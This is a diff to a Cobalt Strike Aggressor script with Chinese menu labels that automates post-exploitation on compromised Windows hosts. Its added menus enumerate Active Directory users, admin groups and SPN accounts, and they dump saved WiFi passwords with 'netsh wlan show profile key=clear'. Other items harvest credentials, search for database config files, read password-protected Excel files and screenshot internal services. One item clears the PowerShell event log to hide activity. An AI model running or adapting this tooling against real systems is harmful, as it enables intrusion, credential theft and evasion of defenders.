@@ -2,7 +2,9 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
@@ -28,7 +30,6 @@ menu "信息收集" {
             drow_checkbox($dialog, "firewall", "查看防火墙配置", "");
             drow_checkbox($dialog, "schtasks_exe", "查看计划任务", "");
             drow_checkbox($dialog, "schtasks", "查看计划任务详情", "");
-            drow_checkbox($dialog, "database", "查找数据库配置文件", "");
             drow_checkbox($dialog, "workstation", "查看开机时间", "");
             drow_checkbox($dialog, "startup", "查看启动项", "");
             drow_checkbox($dialog, "qwinsta", "查看在线用户", "");
@@ -187,15 +188,6 @@ sub schtasks{
     btask($bid, "##  查看计划任务详情  ##", "");
 	btask($bid, "#######################", "");
     bshell($bid, "schtasks /query /fo LIST /v");
-}
-
-sub database{
-    btask($bid, "#########################", "");
-    btask($bid, "##  查找数据库配置文件  ##", "");
-	btask($bid, "#########################", "");
-    prompt_text("网站目录", "", lambda({
-    bshell(@bid, "dir / a / s / b \"$1\ * config *\"");
-        }, @bid => $bid));
 }
 
 sub workstation{
@@ -375,68 +367,14 @@ sub domain_online{
     bshell($bid, "net view");
 }
 
-			item "资产探测" {
-			$bid = $1['@'];
-			$dialog = dialog("资产探测", %(ip => "192.168.1.0/24",bid => $bid), &zichanscan);
-			dialog_description($dialog, "OnlinePC-多协议探测存活主机;OnlineIP-扫描存活主机;OsScan-多协议识别操作系统;");
-			drow_combobox($dialog, "type", "type:", @("OnlinePC","OnlineIP","OSScan","Ping","WebScan","WhatCMS","DomainIP","SameWeb","UrlScan","HostIP","LdapScan","FtpScan"));
-			drow_text($dialog, "ip", "ip:  ");			
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-        }
-sub zichanscan {
-	$arg = join(' ',  @($3['ip'],$3['type']));
-	btask($bid, "###################################",  "");
-    btask($bid, "##  OnlinePC-多协议探测存活主机   ##", "");
-    btask($bid, "##  OnlineIP-扫描存活主机         ##", "");
-    btask($bid, "##  OsScan-多协议识别操作系统     ##", "");
-	btask($bid, "##  Ping-ICMP扫描存活主机         ##", "");
-    btask($bid, "##  WebScan-扫描Web信息/Http服务  ##", "");
-    btask($bid, "##  UrlScan-扫描C段站点URL域名    ##", "");
-    btask($bid, "##  SameWeb-扫描C段站点URL域名    ##", "");
-    btask($bid, "##  DomainIP-域名解析IP           ##", "");
-	btask($bid, "##  HostIP-主机名解析IP           ##", "");
-	btask($bid, "##  WhatCMS-扫描C段WEB以及CMS     ##", "");
-	btask($bid, "##  LdapScan-扫描LDAP服务器       ##", "");
-	btask($bid, "##  FtpScan-扫描FTP服务器         ##", "");
-	btask($bid, "###################################",  "");
-	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
-}
 
-menu "扫描web应用" {
-			item "SharpWebScan" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
-			dialog_description($dialog, "扫描web应用,返回web地址和title。");
-			drow_text($dialog, "ip", "ip:  ");	
-			drow_text($dialog, "port", "ports:  ");			
-			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-       }
-sub SharpWebScan {
-	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
-	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
-}
 
-			item "SharpGetTitle" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpGetTitle", %(ip => "127.0.0.1||127.0.0.1/24",ports => "80-99,443,7001",thread => "100",outfile => "c:\\windows\\Temp\\123.txt",bid => $bid), &SharpGetTitle);
-			dialog_description($dialog, "扫描web应用,返回web地址和title,会在本地输出文件");
-			drow_text($dialog, "ip", "ip:  ");	
-			drow_text($dialog, "ports", "ports:  ");
-			drow_text($dialog, "thread", "thread:  ");
-			drow_text($dialog, "outfile", "outfile:  ");				
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-       }
-sub SharpGetTitle {
-	$arg = join(' ', @("-i",$3['ip'],"-p",$3['ports'],"-t",$3['thread'],"-o",$3['outfile'],"-v"));
-	bexecute_assembly($bid, script_resource("/script/SharpGetTitle.exe"), $arg);
-}
-}
+
 
     menu "查看mstsc记录"{
+					item "获取RDP登录记录"{
+				bexecute_assembly($1, script_resource('/script/ListRDPConnections.exe'), "");
+            }
 	            item "查看所有用户的记录"{
                 $bid = $1['@'];
                 $Dialog = dialog("listlog",%(bid => $bid),&listlogs);
@@ -483,10 +421,6 @@ sub listlog {
 	bpause($bid, 10000);
 
 }
-
-				item "一键获取主机信息"{
-				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetInfo");
-            }
 			
 			
 menu "一键获取信息-Seatbelt" {
@@ -518,6 +452,171 @@ sub Seatbelt_txt {
 
 		}
 		}
+
+menu "获取主机相关信息" {
+				item "一键获取主机信息"{
+				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetInfo");
+            }
+
+				item "显示所有网络接口"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetIPAddress -All");
+            }
+
+				item "显示IP路由表"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetRoute");
+            }
+
+				item "列出ARP缓存"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetNeighbor");
+            }
+
+				item "列出共享"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-SmbMapping");
+            }
+			
+				item "显示网络接口"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetIPAddress");
+            }
+
+				item "列出本地驱动器"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-PSDrive");
+            }
+
+				item "列出安装的补丁"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-HotFix");
+            }
+
+				item "查看注册表自启动项"{
+				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | ft");
+            }
+
+
+}
+
+menu "获取域相关信息" {
+
+				item "获取远程主机信息" {
+				$bid = $1['@'];
+				$dialog = dialog("获取远程主机信息", %(target => "COMPUTERNAME|IPADDRESS",bid => $bid), &scout);
+				dialog_description($dialog, "参数为computername或者ip");
+				drow_text($dialog, "target", "target:  ");	
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+       }
+sub scout {
+	$arg = join(' ', @($3['target']));
+	bexecute_assembly($bid, script_resource("/script/scout.exe"), $arg);
+}
+
+				item "枚举域信息" {
+				$bid = $1;
+				blog($bid, "Let's enumerate the Recon-AD-Domain\n");
+				bdllspawn($bid, script_resource("/script/Recon-AD-Domain.dll"), "", "Recon-AD-Domain", 5000, false);
+			}
+
+		    	item "获取域密码策略与域用户数"{
+				bexecute_assembly($1, script_resource('/script/SharpSpray1.exe'), "--action GET_POLICIES");
+    	}
+
+			item "查询所有本地组和组成员" {
+			$bid = $1['@'];
+			$dialog = dialog("查询所有本地组和组成员", %(computername => "win7/win7.sun.com",bid => $bid), &Recon-AD-AllLocalGroups);
+			dialog_description($dialog, "输入计算机名,用于在特定计算机上查询所有本地组");
+			drow_text($dialog, "computername", "computername:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Recon-AD-AllLocalGroups {
+		blog($bid, "Let's enumerate the $3['computername']\n");
+		bdllspawn($bid, script_resource("/script/Recon-AD-AllLocalGroups.dll"), "$3['computername']", "Recon-AD-AllLocalGroups", 5000, false);	
+}
+
+			item "查询计算机对象和相应的属性" {
+			$bid = $1['@'];
+			$dialog = dialog("查询计算机对象和相应的属性", %(type => "computername/*dc*/All",bid => $bid), &Recon-AD-Computers);
+			dialog_description($dialog, "[计算机名],用于查询包括属性的特定计算机对象,[*dc*],以查询包含dc的计算机名称,[All],查询所有计算机对象包括属性");
+			drow_text($dialog, "type", "type:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Recon-AD-Computers {
+		blog($bid, "Let's enumerate the $3['type']\n");
+		bdllspawn($bid, script_resource("/script/Recon-AD-Computers.dll"), "$3['type']", "Recon-AD-Computers", 5000, false);	
+}
+
+			item "查询组对象和相应的属性" {
+			$bid = $1['@'];
+			$dialog = dialog("查询组对象和相应的属性", %(type => "groupname/*admin*/All",bid => $bid), &Recon-AD-Groups);
+			dialog_description($dialog, "[groupname],用于查询包含属性的特定组对象,[*admin*],以查询包含admin的组名,[All],查询包括属性在内的所有组对象");
+			drow_text($dialog, "type", "type:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Recon-AD-Groups {
+		blog($bid, "Let's enumerate the $3['type']\n");
+		bdllspawn($bid, script_resource("/script/Recon-AD-Groups.dll"), "$3['type']", "Recon-AD-Groups", 5000, false);	
+}
+
+			item "查询特定的计算机和本地组" {
+			$bid = $1['@'];
+			$dialog = dialog("查询组对象和相应的属性", %(computername => "win7.sun.com",groupname => "administrators",bid => $bid), &Recon-AD-LocalGroups);
+			dialog_description($dialog, "[groupname],在计算机上查询特定的本地组和组成员(默认的Administrators组)");
+			drow_text($dialog, "computername", "computername:  ");
+			drow_text($dialog, "groupname", "groupname:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Recon-AD-LocalGroups {
+		blog($bid, "Let's enumerate the $3['computername']\n");
+		bdllspawn($bid, script_resource("/script/Recon-AD-LocalGroups.dll"), "$3['computername']", "$3['groupname']", "Recon-AD-LocalGroups", 5000, false);	
+}
+
+			item "查询配置了SPN用户对象" {
+			$bid = $1;
+			blog($bid, "Let's enumerate the Recon-AD-SPNs\n");
+			bdllspawn($bid, script_resource("/script/Recon-AD-SPNs.dll"), "", "Recon-AD-SPNs", 5000, false);
+			}
+
+			item "查询用户对象和相应的属性" {
+			$bid = $1['@'];
+			$dialog = dialog("查询用户对象和相应的属性", %(type => "username/*admin*/All",bid => $bid), &Recon-AD-Users);
+			dialog_description($dialog, "[username]用于查询包括属性的特定用户对象,[*admin*]查询包含admin的用户名[All]查询所有用户对象,包括属性");
+			drow_text($dialog, "type", "type:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Recon-AD-Users {
+		blog($bid, "Let's enumerate the $3['type']\n");
+		bdllspawn($bid, script_resource("/script/Recon-AD-Users.dll"), "$3['type']", "Recon-AD-Users", 5000, false);	
+}
+}
+
+menu "获取WIFI相关信息" {
+				item "获取连接过的WIFI" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh wlan show profiles");
+			}
+		}
+			    item "获取WIFI密码" {
+             prompt_text("输入SSID", "", lambda({
+            bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
+        }, @ids => $1));
+    }
+
+				item "一键获取连接过的WIFI信息"{
+				bexecute_assembly($1, script_resource('/script/SharpWifiGrabber.exe'), "");
+            }
+
+				item "获取周围的WIFI热点" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh wlan show networks mode=bssid");
+			}
+		}
+			
+
+}
 			
 				item "获取凭证相关信息-Gopher"{
 				bexecute_assembly($1, script_resource('/script/Gopher.exe'), "");
@@ -526,7 +625,12 @@ sub Seatbelt_txt {
 				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "NetVer");
             }
 
-	        item "获取系统登录日志" {
+				item "获取主机命名管道"{
+				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetPipe");
+            }
+
+menu "获取系统登录日志" {
+	        item "获取系统登录日志-1" {
 			$bid = $1;
 			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
 			dialog_description($dialog, "获取Windows登录事件日志：读取登录过本机的登录失败或登录成功（4624,4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。");
@@ -538,6 +642,16 @@ sub SharpEventLog {
 	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
 }
 
+				item "获取系统登录日志-2" {
+                local('$bid');
+                foreach $bid ($1){
+                    blog($1, "Get RDP TerminalServices LocalSessionManager EventLog (ID=21&22&24&25)");
+                    bpowershell_import($bid, script_resource("/script/LocalSessionManager.ps1"));
+                    bpowerpick($bid,"LocalSessionManager");
+                    bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+                }
+            }
+				}
 
 			item "获取回收站等信息" {
 			$bid = $1;
@@ -548,6 +662,19 @@ sub SharpEventLog {
 			dialog_show($dialog);
         }
 sub SharpCheckInfo {
+    btask($bid, "###############################################", "");
+    btask($bid, "##  EnvironmentalVariables-环境变量          ##", "");
+	btask($bid, "##  GetRecycle-获取回收站文件名              ##", "");
+	btask($bid, "##  AllUserDirectories-当前用户和特权        ##", "");
+	btask($bid, "##  PowershellInfo-powershell相关            ##", "");
+	btask($bid, "##  CsharpVersion-已安装的Microsoft.NET版本  ##", "");
+	btask($bid, "##  AvProcessEDRproduct-EDV/AV产品           ##", "");
+	btask($bid, "##  Defender-Windows Defender排除项          ##", "");
+	btask($bid, "##  RecentFiles-最近访问的文件               ##", "");	
+	btask($bid, "##  NetworkConnentions-当前网络连接          ##", "");	
+	btask($bid, "##  ApplockerEnumerating-AppLocker           ##", "");	
+	btask($bid, "##  LAPS-Existance of LAPS                   ##", "");	
+	btask($bid, "###############################################", "");
 	bexecute_assembly($bid, script_resource("/script/SharpCheckInfo.exe"), $3['Type']);
 }
 			item "获取数据库数据" {
@@ -606,6 +733,19 @@ sub SharpDirLister {
 	bexecute_assembly($bid, script_resource("/script/SharpDirLister.exe"), $arg);
 }
 
+				item "查找数据库配置文件" {
+				$bid = $1['@'];
+				$dialog = dialog("查找数据库配置文件", %(path => "c:\\www\\html",Keyword => "DBPath",bid => $bid), &sql_path);
+				dialog_description($dialog, "要查找数据库配置文件,首先得输入一个配置文件里的关键字符,通过读取文件里的关键字符来查找配置文件");
+				drow_text($dialog, "path",  "网站路径: "); 
+				drow_text($dialog, "Keyword",  "关键字符: "); 
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub sql_path{
+	bcd($bid, "$3['path']");
+	bshell($bid, "findstr /s /i \"$3['Keyword']\" *.*");
+} 
 		
 			item "文件搜索" {
 			$bid = $1['@'];
@@ -621,9 +761,127 @@ sub SharpDir {
 		bexecute_assembly($bid, script_resource("/script/SharpDir.exe"), $arg);
 }
 
+		menu "web页面截图" {
+			item "上传scrying" {
+				$bid = $1;
+				$dialog = dialog("上传scrying与targets", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &scrying_upload);	
+				drow_text($dialog, "UploadPath",  "上传路径: "); 
+				drow_file($dialog, "targets", "targets.txt: ");
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub scrying_upload {
+		bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/scrying.exe"));
+		bupload($bid, $3['targets']);		
+    }
+
+            item "运行scrying"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行hack-browser-data",%(targets => "targets.txt",bid => $bid),&scrying_run);
+                    dialog_description($Dialog, "截图目标web、rdp、vnc服务页面,targets.txt表明http,例如http://123.com,运行完毕在当前目录生成output文件夹");
+					drow_text($Dialog, "targets", "targets: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub scrying_run{
+	local('$targets');
+    $targets = $3['targets'];
+	bshell($bid, "scrying.exe -f  $+ $targets");
+}
+
+			item "停止scrying"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im scrying.exe");
+			}
+		}
+		
+        	item "删除scrying"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q scrying.exe");
+        	}
+		}
+	
+	}
+	
+menu "读取excel文件内容"{
+			item "查看excel文件是否设置了密码" {
+			$bid = $1['@'];
+			$dialog = dialog("检测excel文件是否设置了密码", %(filepath => "C:\\123.xlsx",bid => $bid), &SharpExcelibur_check);
+			dialog_description($dialog, "检测excel文件是否设置了密码");
+			drow_text($dialog, "filepath", "filepath:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExcelibur_check {
+		$arg = join(' ', @("check",$3 ['filepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
+}
+
+			item "查看excel文件工作表名(无密码)" {
+			$bid = $1['@'];
+			$dialog = dialog("检测excel文件工作表名", %(filepath => "C:\\123.xlsx",bid => $bid), &SharpExcelibur_sheet_check);
+			dialog_description($dialog, "检测excel文件工作表名");
+			drow_text($dialog, "filepath", "filepath:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExcelibur_sheet_check {
+		$arg = join(' ', @("sheets",$3 ['filepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
+}
+
+			item "查看excel文件工作表名(有密码)" {
+			$bid = $1['@'];
+			$dialog = dialog("检测excel文件工作表名", %(filepath => "C:\\123.xlsx",passwd => "",bid => $bid), &SharpExcelibur_sheet_check_pass);
+			dialog_description($dialog, "检测excel文件工作表名");
+			drow_text($dialog, "filepath", "filepath:  ");
+			drow_text($dialog, "passwd", "passwd:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExcelibur_sheet_check_pass {
+		$arg = join(' ', @("sheets",$3 ['passwd'],$3 ['filepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
+}
+
+			item "读取excel文件内容(无密码)" {
+			$bid = $1['@'];
+			$dialog = dialog("读取excel文件内容(无密码)", %(filepath => "C:\\123.xlsx",sheetname => "",bid => $bid), &SharpExcelibur_sheet_read);
+			dialog_description($dialog, "读取excel文件内容(无密码)");
+			drow_text($dialog, "filepath", "filepath:  ");
+			drow_text($dialog, "sheetname", "sheetname:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExcelibur_sheet_read {
+		$arg = join(' ', @("read",$3 ['sheetname'],$3 ['filepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
+}
+
+			item "读取excel文件内容(有密码)" {
+			$bid = $1['@'];
+			$dialog = dialog("读取excel文件内容(有密码)", %(filepath => "C:\\123.xlsx",sheetname => "",passwd => "",bid => $bid), &SharpExcelibur_sheet_read);
+			dialog_description($dialog, "读取excel文件内容(有密码)");
+			drow_text($dialog, "filepath", "filepath:  ");
+			drow_text($dialog, "sheetname", "sheetname:  ");
+			drow_text($dialog, "passwd", "passwd:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpExcelibur_sheet_read {
+		$arg = join(' ', @("read",$3 ['sheetname'],$3 ['passwd'],$3 ['filepath']));
+		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
+}
+
+}
+
+
+
 
 
 	
-	
-			
 	}
